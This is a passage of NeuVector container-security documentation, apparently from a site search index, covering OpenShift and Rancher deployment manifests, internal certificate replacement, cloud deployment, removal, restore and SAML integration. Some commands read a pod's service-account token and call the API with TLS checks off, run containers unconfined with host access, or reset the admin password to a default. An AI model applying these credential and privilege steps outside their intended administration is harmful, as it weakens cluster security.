Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK - NET_RAW - SYS_CHROOT - MKNOD - AUDIT_WRITE - SETFCAP env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /lib/modules name: modules-vol readOnly: true # - mountPath: /run/runtime.sock # name: runtime-sock # readOnly: true # - mountPath: /host/proc # name: proc-vol # readOnly: true # - mountPath: /host/cgroup # name: cgroup-vol # readOnly: true - mountPath: /var/nv_debug name: nv-debug readOnly: false terminationGracePeriodSeconds: 1200 restartPolicy: Always volumes: - name: modules-vol hostPath: path: /lib/modules # - name: runtime-sock # hostPath: # path: /var/run/crio/crio.sock # - name: proc-vol # hostPath: # path: /proc # - name: cgroup-vol # hostPath: # path: /sys/fs/cgroup - name: nv-debug hostPath: path: /var/nv_debug --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: serviceAccountName: scanner serviceAccount: scanner containers: - name: neuvector-scanner-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/scanner:&lt;version&gt; imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: serviceAccountName: updater serviceAccount: updater containers: - name: neuvector-updater-pod image: image-registry.openshift-image-registry.svc:5000/neuvector/updater:&lt;version&gt; imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never  ","version":"Next 🚧","tagName":"h3"},{"title":"Replacing Internal Certificates","type":0,"sectionRef":"#","url":"/next/deploying/production/internal","content":"","keywords":"","version":"Next 🚧"},{"title":"Internal Communication and Certificates​","type":1,"pageTitle":"Replacing Internal Certificates","url":"/next/deploying/production/internal#internal-communication-and-certificates","content":" NeuVector includes default self-signed certificates for encryption for the Manager (console/UI access), Controller (REST API, internal), Enforcer (internal), and Scanner (internal) communications.  These certificates can be replaced by your own to further harden communication. For replacing certificates used by external access to NeuVector (i.e, browser to the Manager, or REST API to the Controller), please see this section. See below for replacing the certificates used in internal communication between NeuVector containers.  WARNING: Replacing certificates is recommended to be performed only during initial deployment of NeuVector. Replacing on a running cluster (even with rolling upgrade) may result in an unstable state where NeuVector pods are unable to communicate with each other due to a mismatch in certificates, and DATA LOSS may occur.  Replacing Certificates Used in Internal Communications of NeuVector​  Replace the internal encryption files ca.crt, tls.key, tls.crt as follows:  Create a new ca.cfg file with your favorite editor:  [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc. OU = Neuvector CN = Neuvector [v3_req] keyUsage = digitalSignature, keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth, clientAuth subjectAltName = @alt_names [alt_names] DNS.1 = Neuvector   info For additional information on ca.cfg, see https://open-docs.neuvector.com/configuration/console/replacecert.  Choose your scenario from the three options below:  New certificateUpdate current certificate with SANsRegenarate certificate files and add SANs If your certificate is about to expire and you need to generate a new one, follow the steps below: Delete the old ca.crt, tls.key, tls.crt, kubernetes secret, and generate new ones: kubectl delete secret internal-cert -n neuvector openssl genrsa -out ca.key 2048 openssl req -x509 -sha256 -new -nodes -key ca.key -days 3650 -out ca.crt openssl genrsa -out tls.key 2048 openssl req -new -key tls.key -sha256 -out cert.csr -config ca.cfg openssl req -in cert.csr -noout -text openssl x509 -req -sha256 -in cert.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out tls.crt -days 3650 -extensions 'v3_req' -extfile ca.cfg openssl x509 -in tls.crt -text kubectl create secret generic internal-cert -n neuvector --from-file=tls.key --from-file=tls.crt --from-file=ca.crt Then edit the Controller, Enforcer, and Scanner deployment yamls, adding: containers: - name: neuvector-controller/enforcer/scanner-pod volumeMounts: - mountPath: /etc/neuvector/certs/internal/tls.key name: internal-cert readOnly: true subPath: tls.key - mountPath: /etc/neuvector/certs/internal/tls.crt name: internal-cert readOnly: true subPath: tls.crt - mountPath: /etc/neuvector/certs/internal/ca.crt name: internal-cert readOnly: true subPath: ca.crt volumes: - name: internal-cert secret: defaultMode: 420 secretName: internal-cert Then proceed to deploy NeuVector as before. You can also shell into the controller/enforcer/scanner pods to confirm that the ca.crt, tls.key, tls.crt files are the customized ones and that the NeuVector communications are working using the new certificates. Sample patch commands for controller (change namespace to cattle-neuvector-system if needed, and modify for use on enforcer, scanner): NAMESPACE=neuvector kubectl patch deployment -n ${NAMESPACE} neuvector-controller-pod --type='json' -p='[{&quot;op&quot;: &quot;add&quot;, &quot;path&quot;: &quot;/spec/template/spec/volumes/-&quot;, &quot;value&quot;: {&quot;name&quot;: &quot;internal-cert&quot;, &quot;secret&quot;: {&quot;defaultMode&quot;: 420, &quot;secretName&quot;: &quot;internal-cert&quot;}} } ]' kubectl patch deployment -n ${NAMESPACE} neuvector-controller-pod --type='json' -p='[{&quot;op&quot;: &quot;add&quot;, &quot;path&quot;: &quot;/spec/template/spec/containers/0/volumeMounts&quot;, &quot;value&quot;: [{&quot;mountPath&quot;: &quot;/etc/neuvector/certs/internal/cert.key&quot;, &quot;name&quot;: &quot;internal-cert&quot;, &quot;readOnly&quot;: true, &quot;subPath&quot;: &quot;cert.key&quot;}, {&quot;mountPath&quot;: &quot;/etc/neuvector/certs/internal/cert.pem&quot;, &quot;name&quot;: &quot;internal-cert&quot;, &quot;readOnly&quot;: true, &quot;subPath&quot;: &quot;cert.pem&quot;}, {&quot;mountPath&quot;: &quot;/etc/neuvector/certs/internal/ca.cert&quot;, &quot;name&quot;: &quot;internal-cert&quot;, &quot;readOnly&quot;: true, &quot;subPath&quot;: &quot;ca.cert&quot;} ] } ]'   Updating/Deploying with Helm​  As of Helm chart 2.4.1 we can now manage the internal certificate install. The chart values.yaml should be reviewed for all the settings. The below example uses RKE2, standard Ingress and installer certificates.  # add chart helm repo add neuvector https://neuvector.github.io/neuvector-helm/ # update chart helm repo update # add domain for ingress export domain=awesome.sauce # run the helm helm upgrade -i neuvector -n neuvector neuvector/core --create-namespace --set imagePullSecrets=regsecret --set k3s.enabled=true --set k3s.runtimePath=/run/k3s/containerd/containerd.sock --set manager.ingress.enabled=true --set manager.ingress.host=neuvector.$domain --set manager.svc.type=ClusterIP --set controller.pvc.enabled=true --set controller.pvc.capacity=500Mi --set controller.internal.certificate.secret=internal-cert --set cve.scanner.internal.certificate.secret=internal-cert --set enforcer.internal.certificate.secret=internal-cert  ","version":"Next 🚧","tagName":"h3"},{"title":"Public Cloud K8s AKS, EKS, GKE, IBM...","type":0,"sectionRef":"#","url":"/next/deploying/publick8s","content":"","keywords":"","version":"Next 🚧"},{"title":"Deploy NeuVector on a Public Cloud Kubernetes Service​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/next/deploying/publick8s#deploy-neuvector-on-a-public-cloud-kubernetes-service","content":" Deploy NeuVector on any public cloud K8s service such as AWS EKS, Azure AKS, IBM Cloud K8s, Google Cloud, Alibaba Cloud or Oracle Cloud. NeuVector has passed the Amazon EKS Anywhere Conformance and Validation Framework and, as such, is a validated solution and is available as an Add-on for EKS-Anywhere on Snowball Edge devices through the AWS Console.  First, create your K8s cluster and confirm access with kubectl get nodes.  To deploy NeuVector use the sample deployment instructions and examples from the Kubernetes section of the Production Deployment. Edit the sample yaml if you are pulling NeuVector images from a local or cloud registry such as ECR or ACR.  Some cloud providers have integrated load balancers which are easy to deploy by using Type: LoadBalancer instead of NodePort for the NeuVector webui.  NeuVector also supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  Network Access​  Make sure internal and external ingress access is configured properly. For the NodePort service, the random port in the 3xxxx range must be accessible on a public IP of a worker or master node from the outside. You can access the console using the public IP address of any worker node and that port (NodePort), or the public IP of the load balancer and default port 8443. You can view the IP/port using:  kubectl get svc -n neuvector   Most K8s services automatically enable/allow all inter-pod / inter-cluster communication between nodes which also enable the NeuVector containers (enforcers, controllers, manager) to communicate within the cluster.  The sample Kubernetes yaml file will deploy one manager and 3 controllers. It will deploy an enforcer on every node as a daemonset. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues.  ","version":"Next 🚧","tagName":"h3"},{"title":"Microsoft Azure AKS​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/next/deploying/publick8s#microsoft-azure-aks","content":" When deploying a k8s cluster on Azure, the default for Kubernetes RBACs is off. Please enable RBACs to enable the cluster-admin clusterrole, otherwise you will need to create that manually later to support Helm based deployments.  ","version":"Next 🚧","tagName":"h3"},{"title":"Google Cloud Platform / GKE​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/next/deploying/publick8s#google-cloud-platform--gke","content":" You can use the integrated load balancers which are easy to deploy by using ‘Type: LoadBalancer’ instead of NodePort for the NeuVector webui. Configuring persistent storage with type RWM (read write many) may require creating a storage service such as NFS before deploying NeuVector.  NeuVector requires an SDN plug-in such as flannel, weave, or calico.  Use the environment variable NV_PLATFORM_INFO with value platform=Kubernetes:GKE to enable NeuVector to perform GKE specific action such as running the GKE Kubernetes CIS Benchmarks.  ","version":"Next 🚧","tagName":"h3"},{"title":"Handling Auto-Scaling Nodes with a Pod Disruption Budget​","type":1,"pageTitle":"Public Cloud K8s AKS, EKS, GKE, IBM...","url":"/next/deploying/publick8s#handling-auto-scaling-nodes-with-a-pod-disruption-budget","content":" Public cloud providers support the ability to auto-scale nodes, which can dynamically evict pods including the NeuVector controllers. To prevent disruptions to the controllers, a NeuVector pod disruption budget can be created.  For example, create the file below nv_pdr.yaml to ensure that there are at least 2 controllers running at any time.  apiVersion: policy/v1beta1 kind: PodDisruptionBudget metadata: name: neuvector-controller-pdb namespace: neuvector spec: minAvailable: 2 selector: matchLabels: app: neuvector-controller-pod   Then  kubectl create -f nv_pdr.yaml   For more details: https://kubernetes.io/docs/tasks/run-application/configure-pdb/ ","version":"Next 🚧","tagName":"h3"},{"title":"Rancher Deployment","type":0,"sectionRef":"#","url":"/next/deploying/rancher","content":"","keywords":"","version":"Next 🚧"},{"title":"Deploy and Manage NeuVector through Rancher Extensions or Apps & Marketplace​","type":1,"pageTitle":"Rancher Deployment","url":"/next/deploying/rancher#deploy-and-manage-neuvector-through-rancher-extensions-or-apps--marketplace","content":" NeuVector is able to be deployed easily either through Rancher Extensions for Prime customers, or Rancher Apps and Marketplace. The default (Helm-based) NeuVector deployment will deploy NeuVector containers into the cattle-neuvector-system namespace.  Note: Only NeuVector deployments through Rancher Extensions (NeuVector) of Rancher version 2.7.0+, or Apps &amp; Marketplace of Rancher version 2.6.5+ can be managed directly (single sign on to NeuVector console) through Rancher. If adding clusters to Rancher with NeuVector already deployed, or where NeuVector has been deployed directly onto the cluster, these clusters will not be enabled for SSO integration.  NeuVector UI Extension for Rancher​  Rancher Prime customers are able to easily deploy NeuVector and the NeuVector UI Extension for Rancher. This will enable Prime users to monitor and manage certain NeuVector functions and events directly through the Rancher UI. For community users, please see the Deploy NeuVector section below to deploy from Rancher Apps and Marketplace.  The first step is to enable the Rancher Extensions capability globally if it is not already enabled. Install the NeuVector-UI-Ext from the Available list Reload the extension once installation is completed On your selected cluster, install the NeuVector application from the NeuVector tab if the NeuVector app is not already installed. This should take you to the App installation steps. For more details on this installation process, see the Deploy NeuVector section below. The NeuVector dashboard should now be shown from the NeuVector menu for that cluster. From this dashboard, a summary of the security health of the cluster can be monitored. There are interactive elements in the dashboard, such as invoking a wizard to Improve Your (Security Risk) Score, including being able to turn on automated scanning for vulnerabilities if it is not enabled.In addition, the links in the upper right of the dashboard provide convenient single sign on (SSO) links to the full NeuVector console for more detailed analysis and configuration. To uninstall the extension, go back to the Extensions pageNote: Uninstalling the NeuVector UI extension will NOT uninstall the NeuVector app from each cluster. The NeuVector menu will revert to providing an SSO link into the NeuVector console.  Deploy NeuVector​  First, find the NeuVector chart in Rancher charts, select it and review the instructions and various configuration values. (Optional) Create a project to deploy into if desired, e.g. NeuVector. Note: If you see more than one NeuVector chart, don't select the one that is for upgrading legacy NeuVector 4.x Helm chart deployments.    Deploy the NeuVector chart, first configuring appropriate values for a Rancher deployment, such as:  Container run-time, e.g. docker for RKE and containerd for RKE2, or select the K3s value if using K3s.Manager service type: change to LoadBalancer if available on public cloud deployments. If access is only desired through Rancher, any allowed value will work here. See the Important note below about changing the default admin password in NeuVector.Indicate if this cluster will be either a multi-cluster federated Primary, or remote (or select both if either option is desired).Persistent volume for configuration backups    Click 'Install' after you have reviewed and updated any chart values.  After successful NeuVector deployment, you will see a summary of the deployments, daemon sets, and cron job for NeuVector. You will also be able to see the services deployed in the Services Discovery menu on the left.    Manage NeuVector​  You will now see a NeuVector menu item in the left, and selecting that will show a NeuVector tile/button, which when clicked will take you to the NeuVector console, in a new tab.    When this Single Sign On (SSO) access method is used for the first time, a corresponding user in the NeuVector cluster is created for the Rancher user login. The same user name of the Rancher logged in user will be created in NeuVector, with a role of either admin or fedAdmin, and Identity provider as Rancher.    Note in the above screen shot, two Rancher users admin and gkosaka have been automatically created for SSO. If another user is create manually in NeuVector, the Identity provider would be listed as NeuVector, as shown below. This local user can login directly to the NeuVector console without going through Rancher.    important It is recommended to login directly to the NeuVector console as admin/admin to manually change the admin password to a strong password. This will only change the NeuVector identity provider admin user password (you may see another admin user whose identify provider is Rancher). Alternatively, include a ConfigMap as a secret in the initial deployment from Rancher (see chart values for ConfigMap settings) to set the default admin password to a strong password.  Disabling NeuVector/Rancher SSO​  To disable the ability to login to NeuVector from Rancher Manager, go to Settings -&gt; Configuration.    Rancher Legacy Deployments​  The sample file will deploy one manager and 3 controllers. It will deploy an enforcer on every node. See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues.  note Deployment on Rancher 2.x/Kubernetes should follow the Kubernetes reference section and/or Helm based deployment.  Deploy the catalog docker-compose-dist.yml, controllers will be deployed on the labelled nodes, enforcers will be deployed on the rest of nodes. (The sample file can be modified so that enforcers are only deployed to the specified nodes.) Pick one of controllers for the manager to connect to. Modify the manager's catalog file docker-compose-manager.yml, set CTRL_SERVER_IP to the controller's IP, then deploy the manager catalog.  Here are the sample compose files. If you wish to only deploy one or two of the components just use that section of the file.  Rancher Manager/Controller/Enforcer Compose Sample File:  manager: scale: 1 image: neuvector/manager restart: always environment: - CTRL_SERVER_IP=controller ports: - 8443:8443 controller: scale: 3 image: neuvector/controller restart: always privileged: true environment: - CLUSTER_JOIN_ADDR=controller volumes: - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector enforcer: image: neuvector/enforcer pid: host restart: always privileged: true environment: - CLUSTER_JOIN_ADDR=controller volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro labels: io.rancher.scheduler.global: true   ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy Without Privileged Mode​","type":1,"pageTitle":"Rancher Deployment","url":"/next/deploying/rancher#deploy-without-privileged-mode","content":" On some systems, deployment without using privileged mode is supported. These systems must support the ability to add capabilities using the cap_add setting and to set the apparmor profile.  See the sections on deployment with Docker-Compose, Docker UCP/Datacenter for sample compose files.  Here is a sample Rancher compose file for deployment without privileged mode:  manager: scale: 1 image: neuvector/manager restart: always environment: - CTRL_SERVER_IP=controller ports: - 8443:8443 controller: scale: 3 image: neuvector/controller pid: host restart: always cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=controller volumes: - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector enforcer: image: neuvector/enforcer pid: host restart: always cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=controller volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro labels: io.rancher.scheduler.global: true   ","version":"Next 🚧","tagName":"h3"},{"title":"Using Node Labels for Manager and Controller Nodes​","type":1,"pageTitle":"Rancher Deployment","url":"/next/deploying/rancher#using-node-labels-for-manager-and-controller-nodes","content":" To control which nodes the Manager and Controller are deployed on, label each node. Pick the nodes where the controllers are to be deployed. Label them with &quot;nvcontroller=true&quot;. (With the current sample file, no more than one controller can run on the same node.).  For the manager node, label it “nvmanager=true”.  Add labels in the yaml file. For example for the manager:   labels: io.rancher.scheduler.global: true io.rancher.scheduler.affinity:host_label: &quot;nvmanager=true&quot;   For the controller:   labels: io.rancher.scheduler.global: true io.rancher.scheduler.affinity:host_label: &quot;nvcontroller=true&quot;   For the enforcer, to prevent it from running on a controller node (if desired):   labels: io.rancher.scheduler.global: true io.rancher.scheduler.affinity:host_label_ne: &quot;nvcontroller=true&quot;  ","version":"Next 🚧","tagName":"h3"},{"title":"Removing or Resetting NeuVector","type":0,"sectionRef":"#","url":"/next/deploying/remove","content":"","keywords":"","version":"Next 🚧"},{"title":"Removing NeuVector Deployment / Containers​","type":1,"pageTitle":"Removing or Resetting NeuVector","url":"/next/deploying/remove#removing-neuvector-deployment--containers","content":" To remove the NeuVector deployment on Kubernetes, use the same yaml file for deployment in the delete command.  kubectl delete -f neuvector.yaml   This will remove the services and container deployments of NeuVector. You may also want to delete the neuvector namespace, persistent volume and cluster roles and clusterrolebindings created in the deployment steps.  If you deployed NeuVector using a Helm chart or operator you should delete NeuVector using Helm or the appropriate operator command.  ","version":"Next 🚧","tagName":"h3"},{"title":"Resetting NeuVector to an Initial State​","type":1,"pageTitle":"Removing or Resetting NeuVector","url":"/next/deploying/remove#resetting-neuvector-to-an-initial-state","content":" In addition to deleting as discussed above and redeploying NeuVector, the following steps can be taken in Kubernetes to reset NeuVector, which will remove learned rules, groups, and other configuration but leave the NeuVector deployment intact.  Scale the controller deployment to 0.(Optional) if a Persistent Volume is used, delete the persistent volume backup and registry folders created.Scale the controller deployment to 3.  ","version":"Next 🚧","tagName":"h3"},{"title":"Resetting the Admin Password​","type":1,"pageTitle":"Removing or Resetting NeuVector","url":"/next/deploying/remove#resetting-the-admin-password","content":" The admin password is the key to administering the NeuVector deployment and view the cluster network activities. It is important to change the password upon install and keep it safely guarded. Sometimes, the password is guarded too well and become loss or the administrator leaves the company. If you have kubectl access to the cluster, you can reset the admin password to the default using the following steps.  Exec into one of the controllers.  kubectl exec -it &lt;controller&gt; -n neuvector -- sh   Check that the admin entry exists and save the output json somewhere for safe keeping.  consul kv get object/config/user/admin   Take the output from the above consul kv get command and replace the password_hash string with below string.  c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec   Reset the admin account password back to the default. (REPLACE &lt;UPDATED_consul_kv_get_output_with_new_password_hash&gt; BEFORE EXECUTION!!!)  consul kv put object/config/user/admin '&lt;UPDATED_consul_kv_get_output_with_new_password_hash&gt;'   EXAMPLE BELOW: (DO NOT EXECUTE WITHOUT REPLACING WITH OUTPUT)  consul kv put object/config/user/admin '{&quot;fullname&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;password_hash&quot;:&quot;c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec&quot;,&quot;pwd_reset_time&quot;:&quot;2022-03-24T20:50:15.341074451Z&quot;,&quot;pwd_hash_history&quot;:null,&quot;domain&quot;:&quot;&quot;,&quot;server&quot;:&quot;&quot;,&quot;email&quot;:&quot;&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;role_oride&quot;:false,&quot;timeout&quot;:300,&quot;locale&quot;:&quot;en&quot;,&quot;role_domains&quot;:{},&quot;last_login_at&quot;:&quot;2022-03-24T20:49:32.577877044Z&quot;,&quot;login_count&quot;:1,&quot;failed_login_count&quot;:0,&quot;block_login_since&quot;:&quot;0001-01-01T00:00:00Z&quot;}'   Response:  Success! Data written to: object/config/user/admin   Login with admin/admin and change password. ","version":"Next 🚧","tagName":"h3"},{"title":"Restoring NeuVector Configuration","type":0,"sectionRef":"#","url":"/next/deploying/restore","content":"","keywords":"","version":"Next 🚧"},{"title":"Restoring NeuVector Configuration​","type":1,"pageTitle":"Restoring NeuVector Configuration","url":"/next/deploying/restore#restoring-neuvector-configuration","content":" A backup of the NeuVector configuration can be applied to restore a previous configuration of NeuVector. The backup file can be generated manually as well as imported from the console in Settings -&gt; Configuration, choosing all configuration (e.g. registry configurations, integrations, other settings plus policy) or Policy only (e.g. rules/security policy). The rest API can also be used to automatically backup the configuration, as seen in this example.  Cluster events where all controllers stop running, thereby losing real-time configuration state, can be automatically restored when persistent storage has been properly configured.  note NeuVector does not support partial restoration of objects (e.g. network rules only) nor timestamped restoration (e.g. restore from date/time snapshots). Please use automation scripts to regularly backup configuration files and manage timestamps.  important The backup configuration files should not be edited in any way. Any changes to these from their exported state could result in restoration errors and an unpredictable result.  caution Backup configuration files should be used to restore a NeuVector state on the same cluster from which they were exported. Applying a backup configuration file from a different cluster could result in unpredictable results.  Recommended High Availability Settings​  Manual backup and restore of configuration should be planned only as a last resort. The following steps are recommended for high availability.  Use Helm with a ConfigMap for initial deployment and configuration.Use CRDs for defining policy such as network/process, admission control, and other rules.Run multiple controllers (minimum 3) to auto-sync configuration between running pods, and ensure they run on different hosts.Configure persistent storage (as part of step 1) to recover from any cluster wide failures where all controllers stop running.Regularly backup configuration to timestamped backup files.Restore a cluster's NeuVector configuration from a backup file as a last resort, applying any CRDs after restoration that were new or changed since the previous backup. ","version":"Next 🚧","tagName":"h3"},{"title":"Enterprise Integration","type":0,"sectionRef":"#","url":"/next/integration","content":"Enterprise Integration Integrating NeuVector with enterprise infrastructure using RBAC, SYSLOG, SAML, LDAP…","keywords":"","version":"Next 🚧"},{"title":"IBM Security Advisor","type":0,"sectionRef":"#","url":"/next/integration/ibmsa","content":"","keywords":"","version":"Next 🚧"},{"title":"Integrating with IBM Security Advisor​","type":1,"pageTitle":"IBM Security Advisor","url":"/next/integration/ibmsa#integrating-with-ibm-security-advisor","content":" NeuVector Integrates with IBM Security Advisor on IBM Cloud.  To generate the registration URL required, please log into the NeuVector console as an administrator and go to Settings -&gt; Configuration.  Enable &quot;Integrate with IBM Security Advisor&quot; -&gt; SubmitClick &quot;Get URL&quot; -&gt; Copy to clipboard    Then return to the IBM Security Advisor console, and under &quot;Enter the NeuVector setup URL&quot;, type in https://{NeuVector controller hostname/ip}:{port} and paste what is copied in from the steps above. For the port, use the exposed NeuVector REST API port (default is 10443). For multi-cluster environments this is also the 'fed-worker' service which exposes this port.  IBM Security Advisor will communicate with your NeuVector cluster controller thru the provided hostname or IP. Note: This may need to be exposed as a service for access from outside the Kubernetes cluster, similar to how the REST API is exposed as a service.  Verifying the Connection​  When the connection is successfully created between IBM Security Advisor &amp; NeuVector, you will see the green &quot;Connected at {date, time}&quot; icon next to &quot;Integrate with IBM Security Advisor&quot; in the NeuVector Console.    Reviewing Security Events in IBM Security Advisor​  A summary card with security event information is displayed.    Each security event can be investigated in more detail, as shown below:    ","version":"Next 🚧","tagName":"h3"},{"title":"Removing the Integration​","type":1,"pageTitle":"IBM Security Advisor","url":"/next/integration/ibmsa#removing-the-integration","content":" If you delete a NeuVector integration connection in your IBM Cloud account, remember to also disable the &quot;IBM SA integration&quot; for that NeuVector cluster in Settings -&gt; Configuration. ","version":"Next 🚧","tagName":"h3"},{"title":"Enterprise Integration","type":0,"sectionRef":"#","url":"/next/integration/integration","content":"","keywords":"","version":"Next 🚧"},{"title":"Integration​","type":1,"pageTitle":"Enterprise Integration","url":"/next/integration/integration#integration","content":" NeuVector provides a number of ways to integrate, including a REST API, CLI, SYSLOG, RBACs, SAML, LDAP, and webhooks. See the Automation section for examples of scripting using the REST API.  Integrations with other ecosystem partners such as Sonatype (Nexus Lifecycle), IBM Cloud (QRadar and Security Advisor), Prometheus/Grafana, are also supported. Many of these can be found on the NeuVector Github page.  The following configurations can be found in Settings:  OpenShift/Kubernetes RBACs​  Select this option if you are using Red Hat OpenShift Role Based Access Controls (RBACs) and would like NeuVector to automatically read and enforce those. If selected, OpenShift users can log into the NeuVector console using their OpenShift credentials, and will only have access to the resources (Projects, containers, nodes etc) according to their role in the OpenShift cluster. OpenShift integration uses the OAuth2 protocol.    important Do not use the setting in OpenShift AllowAllPasswordIdentityProvider which allows any password to be used to log in. This will allow a user to login into NeuVector with any password as well (as a read only user). It will also create a new user in OpenShift for every login (see ‘oc get user’ results).  note The default Admin user of NeuVector and any additional users created in NeuVector will still be active with OpenShift RBACs enabled.  Kubernetes RBACs​  To manually configure RBACs for Kubernetes namespaces, open the Advanced Setting in the new user creation screen in Settings -&gt; Users -&gt; Add User. Here you can enter the namespaces(s) which this user should have access to in NeuVector.    SYSLOG​  Enter the SYSLOG server IP and select the level of notification. You can also use a DNS name and/or select TCP for configuration.  Webhooks​  Notifications can be sent via webhooks to an endpoint. Enter the endpoint URL for notifications to be sent. Webhook notifications for custom events can be configured in Policy -&gt; Response Rules  Directory/SSO Integration​  See the next sections for LDAP, MSAD, SAML, OpenId and other integrations. See the Basics -&gt; Users &amp; Roles section for predefined and custom roles in NeuVector which can be mapped in the integration. ","version":"Next 🚧","tagName":"h3"},{"title":"SAML (ADFS)","type":0,"sectionRef":"#","url":"/next/integration/adfs","content":"","keywords":"","version":"Next 🚧"},{"title":"Setting Up ADFS and NeuVector Integration​","type":1,"pageTitle":"SAML (ADFS)","url":"/next/integration/adfs#setting-up-adfs-and-neuvector-integration","content":" This section describes the setup steps in ADFS first, then in the NeuVector console.  ADFS Setup​  From AD FS Management, right click on “Relying Party Trusts” and select “Add Relying Party Trust…”.    Select “Start” button from Welcome step.    Select “Enter data about the relying party manually” and select “Next”.    Enter a unique name for Display name field and select “Next”.    Select “Next” to skip token encryption.    Check “Enable support for the SAML 2.0 WebSSO protocol” and enter the SAML Redirect URI from NeuVector Settings&gt;SAML Setting page into the “Relying party SAML 2.0 SSO service URL” field. Select “Next” to continue.    Enter the same SAML Redirect URI into the “Relying party trust identifier” field and click “Add”; then select “Next” to continue.    Customize Access Control; then select “Next” to continue.    Select “Next” to continue.    Select “Close” to finish. Select Edit Claim Issuance Policy…    Select “Add Rule…” and choose “Send LDAP Attributes as Claims”; then select “Next”. Name the rule and choose Active Directory as the Attribute store. Only Username outgoing claim is required for authentication if default role is set; else groups is needed for role mapping. Email is optional.  SAM-Account-Name -&gt; UsernameE-Mail-Address -&gt; EmailToken-Groups – Unqalified Names -&gt; groups    Select “Add Rule…” and choose “Transform an Incoming Claim”; then select “Next”. Name the rule and set the field as captured in the screenshot below. The Outgoing name ID format needs to be Transient Identifier.    NeuVector Setup​  Identify Provider Single Sign-On URL  View Endpoints from AD FS Management &gt; Service and use “SAML 2.0/WS-Federation” endpoint URL.Example: https://&lt;adfs-fqdn&gt;/adfs/ls  Identity Provider Issuer  Right click on AD FS from AD FS Management console and select “Edit Federation Service Properties…”; use the “Federation Service identifier”.Example: http://&lt;adfs-fqdn&gt;/adfs/services/trust  X.509 Certificate  From AD FS Management, select Service &gt; Certificate, right click on Token-signing certificate and choose “View Certificate…”Select the Details tab and click “Copy to File”Save it as a Base-64 encoded x.509 (.CER) fileCopy and paste the contents of the file into the X.509 Certificate field  Group claim  Enter the Outgoing claim name for the groupsExample: groups  Default role  Recommended to be “None” unless you want to allow any authenticated user a default role.  Role map  Set the group names of the users for the appropriate role. (See screenshot example below.)    Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector.  ","version":"Next 🚧","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"SAML (ADFS)","url":"/next/integration/adfs#troubleshooting","content":" ADFS SamlResponseSignature needs to be either MessageOnly or MessageAndAssertion. Use Get-AdfsRelyingPartyTrust command to verify or update it.    Time synchronization between Kubernetes Nodes x ADFS Server  For a successful authentication, the time between the Kubernetess nodes and the ADFS server needs to be the same to avoid time sync or clock drift issues.  It's recommended to use an NTP server, with equal time settings across all servers.  Please check and confirm that both ADFS and NeuVector hosts are synchronized and the potential delays do not exceed more than 10 seconds. You can use Linux and Windows commands to check dates, times and NTP server activity.  tip You can reload the auth times by disabling and enabling again the config in the NeuVector UI as follows: Log in 